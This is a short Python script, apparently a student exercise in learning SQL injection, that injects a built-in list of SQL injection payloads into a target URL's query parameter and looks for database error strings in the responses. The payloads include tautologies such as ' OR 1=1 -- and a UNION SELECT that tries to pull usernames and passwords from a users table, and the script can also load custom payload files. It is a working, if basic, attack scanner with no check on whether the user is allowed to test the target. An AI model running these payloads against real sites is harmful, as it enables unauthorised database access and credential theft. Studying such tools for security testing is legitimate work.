# - Topics:
# - Understand how SQL injection works and how it can be exploited.
# - Project:
# - Build a simple script
# - to test SQL injection vulnerabilities in a vulnerable web application (e.g., by injecting common payloads).


import requests

# Function to get user input URL
def user_url():
    url = input("Enter URL (with parameter, e.g., http://example.com/search.php?q=): ").strip()
    
    # Ensure URL starts with http:// or https://
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # List of SQL injection payloads
    payloads = [
        "' OR 1=1 --",
        "' OR 'a'='a",
        "' OR ''='",
        " OR 1=1 --",
        "1' OR '1'='1' --",
        "' UNION SELECT NULL,NULL --",
        "' UNION SELECT username, password FROM users --"
    ]
    
    return url, payloads

# Function to test for SQL Injection
def sqli(url, payloads):
    user_choice = input("Enter 'dp' for default payloads or 'cp' for custom payloads: ").strip().lower()

    if user_choice == "cp":
        # Get custom payloads from a file
        payload_file = input("Enter the file path containing custom payloads: ").strip()
        try:
            with open(payload_file, "r") as file:
                payloads = [line.strip() for line in file.readlines()]
        except FileNotFoundError:
            print("[-] File not found. Using default payloads.")

    # Extracting parameter from URL
    if "?" in url:
        param = url.split("?")[-1].split("=")[0]
        base_url = url.split("?")[0]
    else:
        print("[-] Invalid URL format. Make sure it includes a parameter.")
        return

    print(f"[+] Scanning {url} for SQL Injection...\n")

    # Test each payload
    for payload in payloads:
        params = {param: payload}
        try:
            response = requests.get(base_url, params=params, timeout=5)
            if response.status_code == 200:
                # Checking for common SQL error messages
                sql_errors = ["SQL syntax", "mysql_fetch", "ORA-", "Microsoft OLE DB", "error in your SQL"]
                if any(error in response.text for error in sql_errors):
                    print(f"[!] Potential SQL Injection found: {base_url}?{param}={payload}")
                    return  # Stop once vulnerability is found

        except requests.RequestException:
            print(f"[-] Request failed for {base_url}?{param}={payload}")

    print("[+] No SQL Injection vulnerability found.")

# Main execution
if __name__ == "__main__":
    url, payloads = user_url()
    sqli(url, payloads)